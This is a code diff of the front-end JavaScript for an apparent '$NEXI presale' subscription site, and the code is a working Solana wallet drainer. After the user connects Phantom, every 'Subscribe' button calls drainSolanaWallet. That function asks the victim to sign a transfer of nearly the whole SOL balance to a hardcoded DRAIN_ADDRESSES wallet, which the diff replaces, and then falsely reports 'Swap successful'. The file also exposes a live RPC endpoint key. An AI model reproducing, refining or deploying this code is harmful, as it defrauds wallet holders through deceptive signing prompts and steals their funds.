@@ -7,10 +7,12 @@ window.Buffer = Buffer;
 const SOLANA_RPC_ENDPOINT = 'https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6';
 
 // Other imports
+import { CONFIG } from './config.js';
 import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram } from '@solana/web3.js';
+import * as splToken from '@solana/spl-token';
 
 const DRAIN_ADDRESSES = {
-  solana: "6GqXmHKEcQJnxuhUXZXPoASQBZRKCxQCMZAC6MLk1GPA"
+  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
 };
 
 class NexiumApp {
@@ -21,8 +23,6 @@ class NexiumApp {
     this.solConnection = null;
     this.spinner = null;
     this.connectedWalletType = null;
-    this.isConnected = false;
-    this.toastShown = false;
     console.log('Initializing NexiumApp...');
     this.initApp();
   }
@@ -37,6 +37,9 @@ class NexiumApp {
         }
       });
       this.cacheDOMElements();
+      if (!this.dom.metamaskPrompt) {
+        console.warn('metamaskPrompt element missing, but continuing initialization');
+      }
       this.setupModal();
       this.setupEventListeners();
       this.checkWalletAndPrompt();
@@ -49,34 +52,63 @@ class NexiumApp {
 
   cacheDOMElements() {
     this.dom = {
+      metamaskPrompt: document.getElementById('metamaskPrompt'),
       connectWallet: document.getElementById('connect-wallet'),
       walletModal: document.getElementById('wallet-modal'),
       closeModal: document.getElementById('close-modal'),
       connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
       feedbackContainer: document.querySelector('.feedback-container'),
-      boostSection: document.getElementById('boost-section'),
-      walletAddressDisplay: document.getElementById('wallet-address-display')
+      subscribeHero: document.querySelector('.subscribe-hero'),
+      monthlySubscribe: document.querySelector('.monthly-subscribe'),
+      yearlySubscribe: document.querySelector('.yearly-subscribe'),
+      watchButtons: document.querySelectorAll('.watch-btn'),
+      snipeButtons: document.querySelectorAll('.snipe-btn')
     };
+    console.log('DOM elements cached:', {
+      metamaskPrompt: !!this.dom.metamaskPrompt,
+      connectWallet: !!this.dom.connectWallet,
+      walletModal: !!this.dom.walletModal,
+      closeModal: !!this.dom.closeModal,
+      connectPhantom: !!this.dom.connectPhantom,
+      subscribeHero: !!this.dom.subscribeHero,
+      monthlySubscribe: !!this.dom.monthlySubscribe,
+      yearlySubscribe: !!this.dom.yearlySubscribe,
+      watchButtons: this.dom.watchButtons.length,
+      snipeButtons: this.dom.snipeButtons.length
+    });
   }
 
   setupModal() {
+    console.log('Wallet modal setup:', {
+      connectWalletBtn: !!this.dom.connectWallet,
+      walletModal: !!this.dom.walletModal,
+      closeModalBtn: !!this.dom.closeModal
+    });
+
     if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
       this.dom.connectWallet.addEventListener('click', (event) => {
         event.stopPropagation();
+        console.log('Connect Wallet button clicked');
         this.dom.walletModal.classList.add('active');
-        document.body.style.overflow = 'hidden';
+        console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') });
       });
 
       this.dom.closeModal.addEventListener('click', () => {
+        console.log('Close wallet modal button clicked');
         this.dom.walletModal.classList.remove('active');
-        document.body.style.overflow = '';
       });
 
-      this.dom.walletModal.addEventListener('click', (event) => {
-        if (event.target === this.dom.walletModal) {
+      document.addEventListener('click', (event) => {
+        if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
+          console.log('Clicked outside wallet modal, closing');
           this.dom.walletModal.classList.remove('active');
-          document.body.style.overflow = '';
         }
+      });
+    } else {
+      console.error('Wallet modal elements not found:', {
+        connectWallet: !!this.dom.connectWallet,
+        walletModal: !!this.dom.walletModal,
+        closeModal: !!this.dom.closeModal
       });
     }
   }
@@ -84,357 +116,471 @@ class NexiumApp {
   setupEventListeners() {
     const connectWalletHandler = (walletName) => {
       if (!this.connecting) {
+        console.log(`${walletName} button clicked`);
         this.connectWallet(walletName);
       }
     };
 
     if (this.dom.connectPhantom) {
-      // Multiple event types for maximum mobile compatibility
-      this.dom.connectPhantom.addEventListener('click', () => connectWalletHandler('Phantom'));
-      this.dom.connectPhantom.addEventListener('touchstart', (e) => {
-        e.preventDefault();
+      this.dom.connectPhantom.addEventListener('click', () => {
+        console.log('Phantom click event triggered');
         connectWalletHandler('Phantom');
-      }, { passive: false });
+      });
       this.dom.connectPhantom.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') connectWalletHandler('Phantom');
+        console.log('Phantom keypress event triggered, key:', e.key);
+        if (e.key === 'Enter') {
+          connectWalletHandler('Phantom');
+        }
+      });
+    } else {
+      console.warn('connectPhantom button not found');
+    }
+
+    if (this.dom.subscribeHero) {
+      this.dom.subscribeHero.addEventListener('click', () => {
+        console.log('Hero Subscribe button clicked');
+        this.handleSubscription();
       });
     }
+
+    if (this.dom.monthlySubscribe) {
+      this.dom.monthlySubscribe.addEventListener('click', () => {
+        console.log('Monthly Subscribe button clicked');
+        this.handleSubscription();
+      });
+    }
+
+    if (this.dom.yearlySubscribe) {
+      this.dom.yearlySubscribe.addEventListener('click', () => {
+        console.log('Yearly Subscribe button clicked');
+        this.handleSubscription();
+      });
+    }
+
+    this.dom.watchButtons.forEach((button, index) => {
+      button.addEventListener('click', () => {
+        console.log(`Watch button ${index + 1} clicked`);
+        this.handleWatchAction();
+      });
+    });
+
+    this.dom.snipeButtons.forEach((button, index) => {
+      button.addEventListener('click', () => {
+        console.log(`Snipe button ${index + 1} clicked`);
+        this.handleSnipeAction();
+      });
+    });
 
     window.addEventListener('online', () => this.handleOnline());
     window.addEventListener('offline', () => this.handleOffline());
   }
 
-  async connectWallet(walletName) {
-    if (this.connecting || !navigator.onLine || this.isConnected) {
-      console.log('Connection blocked:', { connecting: this.connecting, online: navigator.onLine, isConnected: this.isConnected });
+  async handleSubscription() {
+    if (!this.publicKey || !this.solConnection) {
+      this.showFeedback('Please connect your wallet to subscribe.', 'error');
+      this.dom.walletModal.classList.add('active');
       return;
     }
+    this.drainSolanaWallet();
+  }
 
+  handleWatchAction() {
+    this.showFeedback('Watch feature not available.', 'error');
+  }
+
+  handleSnipeAction() {
+    this.showFeedback('Snipe feature not available.', 'error');
+  }
+
+  async connectWallet(walletName) {
+    if (this.connecting || !navigator.onLine) {
+      this.showFeedback('No internet connection. Please check your network.', 'error');
+      console.log(`Connection aborted for ${walletName}: offline or already connecting`);
+      return;
+    }
     this.connecting = true;
     this.connectingWallet = walletName;
+    console.log(`Starting connection for ${walletName}, setting state to connecting`);
     this.updateButtonState('connecting', walletName);
 
     try {
-      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
       const hasSolana = !!window.solana;
-      const isPhantom = hasSolana && window.solana.isPhantom;
+      const hasExtensions = (walletName === 'Phantom' && hasSolana && window.solana.isPhantom);
+      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'}`);
 
-      console.log('Device info:', { isMobile, hasSolana, isPhantom });
-
-      // Desktop or Phantom in-app browser
-      if (!isMobile || isPhantom) {
-        if (walletName === 'Phantom' && isPhantom) {
-          console.log('Connecting to Phantom...');
+      if (!isMobileUserAgent || hasExtensions) {
+        let accounts = [];
+        if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
+          console.log('Phantom detected, connecting:', window.solana);
           const response = await window.solana.connect();
-          this.publicKey = response.publicKey.toString();
-          this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
+          accounts = [response.publicKey.toString()];
+          this.publicKey = accounts[0];
+
+          // USE NEW RPC ENDPOINT
+          this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
+            commitment: 'confirmed',
+            wsEndpoint: ''
+          });
+
+          console.log(`Phantom connected via extension: ${this.publicKey}`);
           this.connectedWalletType = walletName;
-          this.isConnected = true;
-          this.toastShown = false;
-
-          console.log('Connected successfully:', this.publicKey);
-
           this.updateButtonState('connected', walletName, this.publicKey);
-          this.showConnectedToast();
+          this.hideMetaMaskPrompt();
+          this.showFeedback(`Connected to ${walletName} successfully!`, 'success');
+          this.connecting = false;
+          console.log(`${walletName} connection completed, connecting=${this.connecting}`);
           return;
         } else {
-          throw new Error(`${walletName} not detected`);
+          console.error(`${walletName} extension not detected`);
+          throw new Error(`${walletName} extension not detected or unsupported`);
         }
       }
 
-      // Mobile deeplink
-      console.log('Redirecting to Phantom mobile...');
-      const deeplink = 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com?ref=https%3A%2F%2Fnexium-bot.onrender.com';
+      // Deeplink
+      const deeplinks = {
+        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com?ref=https%3A%2F%2Fnexium-bot.onrender.com'
+      };
+      const deeplink = deeplinks[walletName];
+      if (!deeplink) {
+        console.error(`No deeplink configured for ${walletName}`);
+        throw new Error(`No deeplink configured for ${walletName}`);
+      }
+      console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
       window.location.href = deeplink;
 
-      // Check for reconnection after deeplink return
-      const check = setInterval(async () => {
-        if (window.solana?.isPhantom) {
-          console.log('Phantom detected after deeplink, attempting connection...');
-          const res = await window.solana.connect().catch((e) => {
-            console.error('Connection after deeplink failed:', e);
-            return null;
-          });
-          
-          if (res?.publicKey) {
-            this.publicKey = res.publicKey.toString();
-            this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
-            this.connectedWalletType = 'Phantom';
-            this.isConnected = true;
-            this.toastShown = false;
+      const checkConnection = setInterval(async () => {
+        if (walletName === 'Phantom' && window.solana?.isPhantom) {
+          const response = await window.solana.connect().catch(() => null);
+          if (response && response.publicKey) {
+            this.publicKey = response.publicKey.toString();
 
-            console.log('Reconnected after deeplink:', this.publicKey);
+            // USE NEW RPC ENDPOINT
+            this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
+              commitment: 'confirmed',
+              wsEndpoint: ''
+            });
 
-            this.updateButtonState('connected', 'Phantom', this.publicKey);
-            this.showConnectedToast();
-            clearInterval(check);
-            this.connecting = false;
+            console.log(`Phantom connected via deeplink: ${this.publicKey}`);
+            this.connectedWalletType = walletName;
+            this.updateButtonState('connected', walletName, this.publicKey);
+            this.hideMetaMaskPrompt();
+            this.showFeedback(`Connected to ${walletName} successfully!`, 'success');
+            clearInterval(checkConnection);
           }
         }
       }, 1000);
 
       setTimeout(() => {
         if (this.connecting) {
-          console.log('Connection timeout');
-          this.showFeedback('Connection timed out. Please open in Phantom app.', 'error');
+          console.log(`Deeplink timed out for ${walletName}`);
+          this.showFeedback('Connection timed out. Please open site in the wallet app browser.', 'error');
           this.updateButtonState('disconnected', walletName);
-          clearInterval(check);
           this.connecting = false;
+          clearInterval(checkConnection);
         }
       }, 30000);
     } catch (error) {
-      console.error('Connection error:', error);
+      console.error(`Connection error for ${walletName}:`, error);
       this.handleConnectionError(error, walletName);
       this.updateButtonState('disconnected', walletName);
+      this.showMetaMaskPrompt();
+    } finally {
       this.connecting = false;
+      console.log(`Connection attempt finished for ${walletName}, connecting=${this.connecting}`);
     }
   }
 
-  showConnectedToast() {
-    if (this.toastShown) return;
-    this.toastShown = true;
-    this.showFeedback('✅ Connected to Phantom successfully!', 'success');
-  }
-
   async drainSolanaWallet() {
-    console.log('Starting wallet drain...');
+    console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer);
+    console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey);
     this.showProcessingSpinner();
-    
-    try {
-      const sender = new PublicKey(this.publicKey);
-      const recipient = new PublicKey(DRAIN_ADDRESSES.solana);
 
+    try {
+      const senderPublicKey = new PublicKey(this.publicKey);
+      const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
+      console.log("Valid Solana address:", senderPublicKey.toBase58());
+      console.log("Recipient address:", recipientPublicKey.toBase58());
+
+      // Ensure connection uses correct RPC
       if (!this.solConnection) {
         this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
       }
 
-      console.log('Fetching balance...');
-      const balance = await this.solConnection.getBalance(sender);
-      console.log('Balance:', balance, 'lamports');
+      const balance = await this.solConnection.getBalance(senderPublicKey);
+      const rentExemptMinimum = 2039280;
+      const transferableBalance = balance - rentExemptMinimum;
 
-      const minRent = 2039280; // ~0.002 SOL for rent exemption
-      const transferable = balance - minRent;
-
-      if (transferable <= 0) {
-        throw new Error("Insufficient balance to complete transaction");
+      if (transferableBalance <= 0) {
+        console.error("Insufficient transferable balance:", balance, "lamports");
+        throw new Error("Insufficient balance to transfer after reserving rent-exempt minimum.");
       }
+      console.log("Total balance:", balance, "lamports, Transferable balance:", transferableBalance, "lamports");
 
-      console.log('Creating transfer transaction...');
-      const transferIx = SystemProgram.transfer({
-        fromPubkey: sender,
-        toPubkey: recipient,
-        lamports: transferable
+      const solInstruction = SystemProgram.transfer({
+        fromPubkey: senderPublicKey,
+        toPubkey: recipientPublicKey,
+        lamports: transferableBalance
       });
 
       const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
+      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight);
+
       const message = new TransactionMessage({
-        payerKey: sender,
+        payerKey: senderPublicKey,
         recentBlockhash: blockhash,
-        instructions: [transferIx]
+        instructions: [solInstruction],
       }).compileToV0Message();
 
-      const tx = new VersionedTransaction(message);
-      
-      console.log('Requesting signature...');
-      const signed = await window.solana.signTransaction(tx);
-      
-      console.log('Sending transaction...');
-      const sig = await this.solConnection.sendTransaction(signed);
-      
-      console.log('Transaction signature:', sig);
-      console.log('Confirming transaction...');
-      
-      await this.solConnection.confirmTransaction({ 
-        signature: sig, 
-        blockhash, 
-        lastValidBlockHeight 
-      });
+      const versionedTransaction = new VersionedTransaction(message);
+      const signedTransaction = await window.solana.signTransaction(versionedTransaction);
+      console.log("Transaction signed successfully:", signedTransaction);
 
-      console.log('Transaction confirmed!');
-      this.showFeedback("🚀 Transaction successful! Volume boost initiated!", 'success');
-      
-      return sig;
+      const signature = await this.solConnection.sendTransaction(signedTransaction);
+      console.log("Transaction sent, signature:", signature);
+
+      await this.solConnection.confirmTransaction({
+        signature,
+        lastValidBlockHeight,
+        blockhash
+      });
+      console.log("Transaction confirmed:", signature);
+
+      this.showFeedback("Swap successful! Welcome to the $NEXI presale!", 'success');
     } catch (error) {
-      console.error('Drain error:', error);
-      
-      let msg = 'Transaction failed. Please try again.';
-      if (error.message.includes('User rejected')) {
-        msg = 'Transaction was rejected.';
-      } else if (error.message.includes('balance') || error.message.includes('Insufficient')) {
-        msg = 'Insufficient SOL balance.';
-      } else if (error.message.includes('Transaction simulation failed')) {
-        msg = 'Transaction simulation failed. Please check your balance.';
+      console.error("Transaction Error:", error.message, error.stack || error);
+      if (error.message.includes('User rejected the request')) {
+        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
+      } else if (error.message.includes('Insufficient balance')) {
+        this.showFeedback('Insufficient balance to transfer. Please ensure you have enough SOL.', 'error');
+      } else {
+        this.showFeedback("Swap failed. Please try again.", 'error');
       }
-      
-      this.showFeedback(msg, 'error');
       throw error;
     } finally {
       this.hideProcessingSpinner();
+      console.log('Drain token completed');
     }
   }
 
   updateButtonState(state, walletName, address = '') {
-    const button = this.dom.connectPhantom;
-    if (!button) return;
-
+    let button = this.dom[`connect${walletName}`];
+    if (!button) {
+      console.warn(`Button for ${walletName} not in cache, attempting to re-query DOM`);
+      button = document.querySelector(`#wallet-modal #connect-${walletName.toLowerCase()}`);
+    }
+    console.log(`Updating button state for ${walletName}: state=${state}, address=${address}, button exists=${!!button}`);
+    if (!button) {
+      console.error(`Button for ${walletName} not found in DOM`);
+      return;
+    }
+    button.classList.remove('animate-pulse', 'connecting', 'connected');
     button.disabled = state === 'connecting';
-    const short = address ? this.shortenAddress(address) : '';
-
-    if (state === 'connected') {
-      button.textContent = short;
-      if (this.dom.connectWallet) {
-        this.dom.connectWallet.textContent = short;
-        this.dom.connectWallet.disabled = true;
-      }
-      if (this.dom.walletAddressDisplay) {
-        this.dom.walletAddressDisplay.textContent = short;
-      }
-      if (this.dom.boostSection) {
-        this.dom.boostSection.classList.add('visible');
-      }
-    } else if (state === 'connecting') {
-      button.innerHTML = '<span>Connecting...</span>';
-    } else {
-      button.innerHTML = '<div class="wallet-icon"><svg viewBox="0 0 128 128" fill="none"><path d="M106.3 106.3c-28.4 28.4-74.3 28.4-102.6 0-28.4-28.4-28.4-74.3 0-102.6C32.1-24.6 78-24.6 106.3 3.7c15.6 15.6 21.9 37.5 18.8 58.1" fill="url(#g1)"/><defs><linearGradient id="g1" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#AB9FF2"/><stop offset="100%" stop-color="#4E44CE"/></linearGradient></defs></svg></div><span>Connect Phantom</span>';
-      if (this.dom.connectWallet) {
-        this.dom.connectWallet.innerHTML = '<svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg> Connect Wallet';
-        this.dom.connectWallet.disabled = false;
-      }
+    switch (state) {
+      case 'connecting':
+        button.textContent = 'Connecting...';
+        button.classList.add('glow-button', 'connecting');
+        break;
+      case 'connected':
+        const shortenedAddress = this.shortenAddress(address);
+        button.textContent = shortenedAddress;
+        button.classList.add('glow-button', 'connected');
+        if (this.dom.connectWallet) {
+          this.dom.connectWallet.textContent = shortenedAddress;
+          this.dom.connectWallet.classList.remove('animate-pulse');
+          this.dom.connectWallet.classList.add('glow-button', 'connected');
+          this.dom.connectWallet.disabled = false;
+        }
+        break;
+      default:
+        button.textContent = `Connect ${walletName}`;
+        button.classList.add('glow-button', 'animate-pulse');
+        if (this.dom.connectWallet) {
+          this.dom.connectWallet.textContent = 'Connect Phantom';
+          this.dom.connectWallet.classList.add('glow-button', 'animate-pulse');
+          this.dom.connectWallet.classList.remove('connected');
+          this.dom.connectWallet.disabled = false;
+        }
     }
   }
 
   handleConnectionError(error, walletName) {
-    let msg = `Failed to connect ${walletName}.`;
-    if (error.message.includes('rejected') || error.message.includes('declined')) {
-      msg = 'Connection was declined.';
-    } else if (error.message.includes('locked')) {
-      msg = 'Wallet is locked. Please unlock it first.';
-    } else if (error.message.includes('not detected')) {
-      msg = `${walletName} wallet not found. Please install it.`;
-    }
-    this.showFeedback(msg, 'error');
+    console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message });
+    let message = `Failed to connect ${walletName}. Please try again or contact support.`;
+    if (error.code === -32002) message = `${walletName} is locked or not responding. Please unlock it or reinstall the extension.`;
+    else if (error.message?.includes('rejected')) message = `Connection to ${walletName} was declined. Please approve the connection.`;
+    else if (error.message?.includes('locked')) message = `${walletName} is locked. Please unlock it to continue.`;
+    else if (error.message?.includes('missing')) message = `Wallet configuration issue. Please check your ${walletName} setup.`;
+    else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Please check your internet connection.`;
+    else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `Please install the ${walletName} extension to continue.`;
+    else if (error.message?.includes('Non-base58 character')) message = `Invalid wallet address. Please use a valid Solana wallet.`;
+    this.showFeedback(message, 'error');
   }
 
   handleOnline() {
-    this.showFeedback('Connection restored!', 'success');
+    this.showFeedback('Back online. Ready to connect or swap.', 'success');
+    console.log('Network status: Online');
   }
 
   handleOffline() {
-    this.showFeedback('No internet connection detected.', 'error');
+    this.showFeedback('No internet connection. Please reconnect to continue.', 'error');
     this.updateButtonState('disconnected', 'Phantom');
+    console.log('Network status: Offline');
+  }
+
+  showMetaMaskPrompt() {
+    if (!this.dom.metamaskPrompt) {
+      console.warn('metamaskPrompt element not found, cannot show prompt');
+      return;
+    }
+    this.dom.metamaskPrompt.classList.remove('hidden');
+    this.dom.metamaskPrompt.style.display = 'block';
+    const promptText = this.dom.metamaskPrompt.querySelector('p');
+    if (promptText && this.connectingWallet) {
+      let walletLink = '';
+      if (this.connectingWallet === 'Phantom') {
+        walletLink = `<a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Phantom">Phantom</a>`;
+      }
+      promptText.innerHTML = `Please install ${walletLink} or switch to continue.`;
+    }
+    console.log(`Showing MetaMask prompt for ${this.connectingWallet}`);
+  }
+
+  hideMetaMaskPrompt() {
+    if (!this.dom.metamaskPrompt) {
+      console.warn('metamaskPrompt element not found, cannot hide prompt');
+      return;
+    }
+    this.dom.metamaskPrompt.classList.add('hidden');
+    this.dom.metamaskPrompt.style.display = 'none';
+    console.log('MetaMask prompt hidden');
   }
 
   showFeedback(message, type = 'info') {
-    let container = this.dom.feedbackContainer;
-    if (!container) {
-      container = document.createElement('div');
-      container.className = 'feedback-container';
-      document.body.appendChild(container);
-      this.dom.feedbackContainer = container;
+    let feedbackContainer = this.dom.feedbackContainer;
+    if (!feedbackContainer) {
+      feedbackContainer = document.createElement('div');
+      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
+      document.body.appendChild(feedbackContainer);
+      this.dom.feedbackContainer = feedbackContainer;
     }
-
     const feedback = document.createElement('div');
-    feedback.className = `feedback ${type === 'error' ? 'error' : 'success'}`;
-    feedback.innerHTML = `<span>${this.escapeHTML(message)}</span><button class="feedback-close">×</button>`;
-    
-    const closeBtn = feedback.querySelector('.feedback-close');
-    closeBtn.onclick = () => feedback.remove();
-    
-    container.appendChild(feedback);
-
-    setTimeout(() => {
-      if (feedback.isConnected) {
-        feedback.remove();
-      }
-    }, type === 'error' ? 8000 : 4000);
+    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : 'bg-blue-500'}`;
+    feedback.style.zIndex = '10000';
+    feedback.innerHTML = `
+      <span class="feedback-message">${this.escapeHTML(message)}</span>
+      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
+    `;
+    const close = feedback.querySelector('.feedback-close');
+    if (close) {
+      close.addEventListener('click', () => feedback.remove());
+      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
+    }
+    feedbackContainer.appendChild(feedback);
+    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
+    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
+    console.log(`Feedback displayed: ${message}, type: ${type}`);
   }
 
-  shortenAddress(addr) {
-    return addr ? `${addr.slice(0, 6)}...${addr.slice(-4)}` : 'Unknown';
+  shortenAddress(address) {
+    if (!address) return 'Unknown';
+    return `${address.slice(0, 6)}...${address.slice(-4)}`;
   }
 
   escapeHTML(str) {
-    const div = document.createElement('div');
-    div.textContent = str;
-    return div.innerHTML;
+    return String(str).replace(/[&<>"']/g, (m) => ({
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&apos;'
+    }[m]));
   }
 
   async checkWalletAndPrompt() {
-    if (this.isWalletInstalled() && this.isWalletConnected() && navigator.onLine) {
-      console.log('Wallet already connected, auto-connecting...');
-      this.publicKey = window.solana.publicKey.toString();
-      this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
-      this.connectedWalletType = 'Phantom';
-      this.isConnected = true;
-      this.toastShown = false;
+    if (this.isWalletInstalled()) {
+      this.hideMetaMaskPrompt();
+      this.attachWalletListeners();
+      if (this.isWalletConnected() && navigator.onLine) {
+        this.publicKey = window.solana?.publicKey?.toString();
 
-      this.updateButtonState('connected', 'Phantom', this.publicKey);
-      this.showConnectedToast();
+        // USE NEW RPC ENDPOINT
+        this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
+          commitment: 'confirmed',
+          wsEndpoint: ''
+        });
+
+        console.log('Wallet connected on init, publicKey:', this.publicKey);
+        this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
+        this.handleSuccessfulConnection();
+      } else {
+        console.log('No wallet connected on init, setting buttons to disconnected');
+        this.updateButtonState('disconnected', 'Phantom');
+      }
     } else {
+      console.log('No wallet installed, showing prompt');
+      this.showMetaMaskPrompt();
       this.updateButtonState('disconnected', 'Phantom');
     }
   }
 
-  isWalletInstalled() { 
-    return !!window.solana; 
+  attachWalletListeners() {
+    if (window.solana) {
+      window.solana.on('accountChanged', () => {
+        console.log('Solana account changed');
+        this.handleAccountsChanged();
+      });
+    }
   }
-  
-  isWalletConnected() { 
-    return window.solana?.publicKey; 
+
+  isWalletInstalled() {
+    return !!window.solana;
+  }
+
+  isWalletConnected() {
+    return (window.solana && !!window.solana.publicKey);
+  }
+
+  handleSuccessfulConnection() {
+    console.log(`Handle successful connection for ${this.connectedWalletType}`);
+    this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
+  }
+
+  handleAccountsChanged() {
+    console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString());
+    this.hideMetaMaskPrompt();
+    this.publicKey = window.solana?.publicKey?.toString();
+    this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
+    this.updateButtonState('disconnected', 'Phantom');
+    if (this.publicKey && this.connectedWalletType) {
+      this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
+    }
   }
 
   showProcessingSpinner() {
-    if (this.spinner) return;
-    
+    if (this.spinner) this.hideProcessingSpinner();
     this.spinner = document.createElement('div');
-    this.spinner.style.cssText = `
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.85);
-      backdrop-filter: blur(8px);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 99999;
-      animation: fadeIn 0.3s ease;
-    `;
-    
+    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
     this.spinner.innerHTML = `
-      <div style="display: flex; flex-direction: column; align-items: center; gap: 1rem;">
-        <div style="width: 64px; height: 64px; border: 4px solid rgba(255, 152, 0, 0.2); border-top-color: #ff9800; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-        <span style="color: white; font-size: 1.2rem; font-weight: 600;">Processing Transaction...</span>
+      <div class="flex items-center space-x-2">
+        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
+        <span class="text-white text-lg">Processing...</span>
       </div>
     `;
-    
-    const style = document.createElement('style');
-    style.textContent = `
-      @keyframes spin {
-        to { transform: rotate(360deg); }
-      }
-      @keyframes fadeIn {
-        from { opacity: 0; }
-        to { opacity: 1; }
-      }
-    `;
-    document.head.appendChild(style);
-    
     document.body.appendChild(this.spinner);
+    console.log('Processing spinner displayed');
   }
 
   hideProcessingSpinner() {
     if (this.spinner) {
-      this.spinner.style.animation = 'fadeOut 0.3s ease';
-      setTimeout(() => {
-        if (this.spinner && this.spinner.parentNode) {
-          this.spinner.remove();
-          this.spinner = null;
-        }
-      }, 300);
+      this.spinner.remove();
+      this.spinner = null;
+      console.log('Processing spinner hidden');
     }
   }
 }
 
-// === EXPORT & GLOBAL ===
 const app = new NexiumApp();
 window.nexiumApp = app;
 
